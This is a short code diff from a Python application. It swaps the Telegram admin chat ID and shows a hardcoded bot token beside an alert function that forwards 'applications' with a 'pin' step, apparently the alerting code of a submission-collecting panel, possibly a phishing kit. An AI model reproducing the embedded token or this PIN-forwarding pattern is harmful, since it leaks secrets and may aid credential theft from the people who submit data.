@@ -15,7 +15,7 @@ applications_collection = db["applications"]
 
 # Telegram Configuration
 TELEGRAM_BOT_TOKEN = "9089664143:AAE1TYS1IEcewIu6XGdc14CxeZTsDQ6pc1g"
-TELEGRAM_ADMIN_CHAT_ID = "6558384338"
+TELEGRAM_ADMIN_CHAT_ID = "7648848652"
 
 def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
     db_id = str(app_data.get("_id"))
